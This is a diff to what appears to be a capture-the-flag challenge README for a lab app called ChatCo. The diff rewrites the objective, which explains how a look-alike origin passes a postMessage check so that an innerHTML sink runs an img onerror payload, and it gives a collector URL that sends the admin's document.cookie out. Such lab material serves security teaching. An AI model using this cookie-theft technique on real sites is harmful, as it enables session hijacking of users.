@@ -29,11 +29,14 @@ The admin bot logs in (`/internal/bot-login`) and visits any path you queue via
 
 ## Objective
 
-Serve — or point the widget at — a frame on a **look-alike origin** that
-`postMessage`s an HTML payload up to ChatCo's handler. Because the handler runs in
-ChatCo's own **top-level, authenticated** page and writes your data with
-`innerHTML`, an `<img onerror>` executes there with the admin's cookie in scope.
-Beacon it to the collector:
+Point the widget at a frame on a **look-alike origin** that `postMessage`s an HTML
+payload up to ChatCo's handler. (The **legit** `widget-host` won't help you: it only
+ever sends a fixed, safe message and ignores your `msg` — it passes the origin check
+but carries no payload. You need an origin that both _reflects your payload_ and
+_passes the check_, and only a look-alike does both.) Because the handler runs in
+ChatCo's own **top-level, authenticated** page and writes your data with `innerHTML`,
+an `<img onerror>` executes there with the admin's cookie in scope. Beacon it to the
+collector:
 
 ```
 http://collector:9000/report?c=<document.cookie>
